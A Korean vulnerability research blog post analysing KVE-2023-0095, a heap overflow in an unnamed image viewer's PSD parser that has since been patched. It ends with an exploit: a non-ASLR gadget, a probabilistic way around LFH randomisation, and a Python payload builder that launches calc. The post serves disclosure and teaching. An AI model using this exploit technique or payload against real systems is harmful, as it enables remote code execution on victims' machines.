---
layout: page
title: "Heap Overflow in Image Viewer PSD File Parsing (KVE-2023-0095)"
subtitle: "Exploiting insufficient size validation in PSD image parser"
date: 2023-01-15 00:00:00 +0900
categories: ["vulnerability-research"]
---

## Intro

> **KVE-2023-0095**

본 글은 Windows 이미지 뷰어 소프트웨어의 PSD(Photoshop Document) 파일 파싱 과정에서 발견한 Heap Overflow 취약점에 대한 분석 내용을 담고 있다. KISA 버그바운티를 통해 제보하였으며, KVE-2023-0095로 등록되었다.

![Untitled]({{ "/assets/img/blog/kve-2023-0095/Untitled.png" | prepend: site.baseurl }})

---

## Overview

코드 분석에 들어가기 전, 사전 조사를 진행했다.

분석 대상 소프트웨어는 Viewer 종류이며, 확장자에 따라 진입하는 Dynamic Link Library가 달라지는 구조였다. 파싱하는 이미지 확장자가 다양했기 때문에, 분석 대상 확장자를 먼저 선정해야 했다.

대중적인 png, jpg 등의 이미지 파일의 경우 인증된 오픈소스를 사용하여 파싱하거나, 이미 다른 연구자들이 많이 분석했을 가능성이 높기 때문에 우선순위에서 마지막에 배치하였다.

최종적으로 **PSD(PhotoShop Document)** 확장자를 분석 대상으로 선정했다.

바탕화면에 PSD 파일 샘플을 준비한 뒤, **Procmon**을 통해 파일 시스템 활동을 모니터링하였다.

![Procmon ReadFile Monitoring]({{ "/assets/img/blog/kve-2023-0095/1.png" | prepend: site.baseurl }})

위 그림은 `original.psd` 파일에 대한 `ReadFile` 활동만 필터링한 모습이다. 오른쪽에서 파일의 지정된 offset과 크기(Length)만큼 ReadFile이 진행되는 것을 확인할 수 있다. 이를 통해 실제 File data를 Parsing하는 과정을 추적할 수 있게 된다.

![Procmon Backtrace]({{ "/assets/img/blog/kve-2023-0095/2.png" | prepend: site.baseurl }})

여러 줄 중 한 곳을 더블클릭하면 ReadFile 기준으로 **backtrace**를 확인할 수 있다. 이를 통해 상단 프로세스에서 어떤 DLL을 사용하고, 어디서 ReadFile을 호출하는지 파악할 수 있다.

---

## Analyze

Procmon backtrace를 통해 ReadFile 호출까지 진입하는 DLL이 총 3개임을 확인했다.

```
A.dll → B.dll → C.dll → ReadFile
```

### A.dll — File Validation

![A.dll L_FileInfo]({{ "/assets/img/blog/kve-2023-0095/3.png" | prepend: site.baseurl }})

![A.dll ReadFile]({{ "/assets/img/blog/kve-2023-0095/4.png" | prepend: site.baseurl }})

A.dll의 `L_FileInfo` 함수에서 특정 크기만큼 데이터를 ReadFile하는 것을 확인했다. 파일의 크기가 지나치게 작은지 확인하는 기능으로, 이후 B.dll로 진입하는 코드로 이어진다.

### B.dll — Signature Verification

![B.dll Switch]({{ "/assets/img/blog/kve-2023-0095/5.png" | prepend: site.baseurl }})

B.dll에서는 24바이트만큼 파일 data를 읽은 뒤, switch 분기를 통해 파일 시그니처 값을 비교하여 알맞은 확장자인지 확인한다.

- `"8BPS"` → PSD file header

![B.dll DLL Load]({{ "/assets/img/blog/kve-2023-0095/6.png" | prepend: site.baseurl }})

이후 확장자에 알맞은 DLL을 로드하여 C.dll의 Load 함수로 진입시킨다.

### C.dll — PSD Parser

![C.dll Load Function]({{ "/assets/img/blog/kve-2023-0095/7.png" | prepend: site.baseurl }})

C.dll의 Load 함수에서 30바이트만큼 ReadFile한 뒤, PSD 파일 구조에 맞게 File Header 값들을 파싱한다.

### PSD File Structure

![PSD Structure]({{ "/assets/img/blog/kve-2023-0095/8.png" | prepend: site.baseurl }})

![PSD Header Detail]({{ "/assets/img/blog/kve-2023-0095/9.png" | prepend: site.baseurl }})

1. **File Header** — Signature, Version, Reserved, Channels, Height, Width, Depth, Color Mode
2. **Color Mode Data**
3. **Image Resources**
4. **Layer and Mask Information**
5. **Image Data**

### The Vulnerability

![LocalAlloc and Copy]({{ "/assets/img/blog/kve-2023-0095/10.png" | prepend: site.baseurl }})

Load 함수에서 `LocalAlloc`을 통해 특정 사이즈를 할당하고, 하위 함수 `sub_1004FF0`에서 FileData를 복사하는 것을 확인했다.

![sub_1004FF0 Detail]({{ "/assets/img/blog/kve-2023-0095/11.png" | prepend: site.baseurl }})

`sub_1004FF0` 함수는 File data에서 **2byte만큼 Read**하여 size를 가져온 뒤, 앞서 LocalAlloc으로 할당한 힙 주소(a2)에 해당 size만큼 data를 복사한다. 여기서 핵심은 — 할당 사이즈와 복사 사이즈가 **모두 파일 데이터에서 가져온 값**이라는 점이다. 만약 할당 사이즈와 복사하는 2byte size를 조작할 수 있다면 **Heap Overflow**를 유발할 수 있다.

### Size Validation

![Size Validation Code]({{ "/assets/img/blog/kve-2023-0095/12.png" | prepend: site.baseurl }})

A.dll에 size 검증 코드가 존재했다. `LocalAlloc`하는 data size 값은 PSD File Structure의 **width** 값이다. 실제 copy할 size를 읽어와서 width 값과 비교한 뒤, width 값(할당될 size)이 더 작다면 예외 처리한다. **그러나 이 검증은 단 한 번만 수행된다.**

File data는 한 번에 복사되지 않고, **section 별로 반복하여 복사**된다. 즉 첫 번째 data section의 size만 정상적인 값(width보다 작은)을 주고, 이후 section의 size를 크게 설정하면?

![Heap Overflow]({{ "/assets/img/blog/kve-2023-0095/14.png" | prepend: site.baseurl }})

**Heap Overflow**가 발생한다.

---

## Exploit

### Gadget Search

![CMD Gadget]({{ "/assets/img/blog/kve-2023-0095/15.png" | prepend: site.baseurl }})

가젯을 탐색하던 중, CMD 명령을 실행할 수 있는 코드 시퀀스를 **ASLR이 비활성화된 영역**에서 발견했다. `ESI` 레지스터가 인자로 들어가는데, 이는 overflow 시 덮을 수 있는 레지스터이다.

### Exploitation Strategy

![Exploit Overview]({{ "/assets/img/blog/kve-2023-0095/16.png" | prepend: site.baseurl }})

```
Small size allocation → Heap Overflow → Function Pointer Overwrite → RCE
```

원래 `a1->pfuncC` 함수 포인터를 덮으려 했으나, 이는 스택 영역의 구조체였다. 해당 코드 뒤에서 사용하는 vftable이나 덮을 구조체가 거의 존재하지 않았다. WinDbg를 통해 해당 함수에 오기까지 할당되는 힙 주소 목록을 추적한 결과, **`a1->dword10` 객체가 힙 영역**인 것을 확인했다.

### Function Pointer

![Function Pointer in DLL]({{ "/assets/img/blog/kve-2023-0095/17.png" | prepend: site.baseurl }})

`a1->pfuncC` 함수 내부로 진입하면 다른 DLL 영역에 도달한다. 이 영역에서 `a7(a1->dword10)` 구조체의 값을 **함수 포인터로 사용**하는 코드를 발견했다.

### LFH Bypass

![WinDbg LFH Analysis]({{ "/assets/img/blog/kve-2023-0095/18.png" | prepend: site.baseurl }})

WinDbg 디버깅 결과: `0x081a3058`은 할당된 `a1->dword10` 객체이며, 앞쪽에 LFH가 활성화된 Hole(0x80) 0x40개가 존재한다 (0x80 × 0x40 = 0x2000). Width를 변조하여 0x80 크기가 할당되도록 만들면, `a1->dword10` 객체보다 **낮은 주소**인 LFH Hole 부분에 할당시킬 수 있다. LFH 할당 지점은 0x40개 중 Random이고, 소프트웨어 특성상 **Heap Spray는 불가능**하다.

![Iterative Copy]({{ "/assets/img/blog/kve-2023-0095/19.png" | prepend: site.baseurl }})

**그러나** File Data를 한 번에 복사하는 것이 아닌, **반복을 통해 나눠서 복사**하는 특성을 활용했다. 가장 작은 size(0x80)부터 가장 큰 size(0x2000)까지 2byte size 값을 파일에 삽입하고, payload를 같이 삽입하여 **Heap Overflow를 반복 유발**하면 LFH를 확률적으로 우회할 수 있다.

### Exploit Conditions

```cpp
int pfuncC(a1, a2, a3, a4, a5, a6, over)
{
    if ( !over[2] )    { ... }     // over[2] != 0 required
    if ( over[399] )   { ... }     // over[399] == 0 required

    switch ( over[1] ) {
        ...
        default:
            if ( over[2] )  goto LABEL_195;
            if ( !over[3] ) goto LABEL_200;   // over[3] == 0 required
            v50 = over[393];                   // function pointer
            return v50(a1, ...);               // RCE
    }
}
```

```
over[0]   = ESI (command argument)
over[2]   = non-zero
over[3]   = 0
over[393] = gadget address (ret)
over[399] = 0
```

### Final Payload

```python
f = open('payload', 'wb')
string = b''
a = 0x2000 - 0x80 + 0x58
for i in range(a, 0, -0x80):
    string += (i + 0x640).to_bytes(2, 'big')
f.write(string)  # size section
f.write(b'====' * 4)

ret = (0xB39BFB).to_bytes(4, 'little')
cmd = b'c\x00a\x00l\x00c\x00'
payload = b''
payload += cmd                    # esi  → over[0]
payload += b'\x00\x00\x00\x01'   # over[2]
payload += b'\x00\x00\x00\x00'   # over[3]
payload += b'AAAA' * 389         # dummy
payload += ret                    # over[393]
payload += b'AAAA' * 5           # dummy
payload += b'\x00\x00\x00\x00'   # over[399]

d = b'AAAA' + b'\x00\x00\x00\x00'
for i in range(a, 0, -0x80):
    f.write(d * int(i / 8) + payload)  # data section

f.close()
```

![RCE Success]({{ "/assets/img/blog/kve-2023-0095/20.png" | prepend: site.baseurl }})

**RCE 성공.**

---

## Timeline

| Date | Event |
|------|-------|
| 2023.01 | KISA 버그바운티 제보 |
| 2023.04 | 패치 완료 (v9.24) |

---

## Key Takeaways

- 반복적으로 처리되는 데이터에 대해 **단일 검증(single-pass validation)은 불충분**하다
- **Non-ASLR 모듈**은 여전히 심각한 보안 위협이며, 안정적인 gadget 주소를 제공한다
- **LFH randomization**은 반복적 heap overflow가 가능한 구조에서 확률적으로 우회될 수 있다
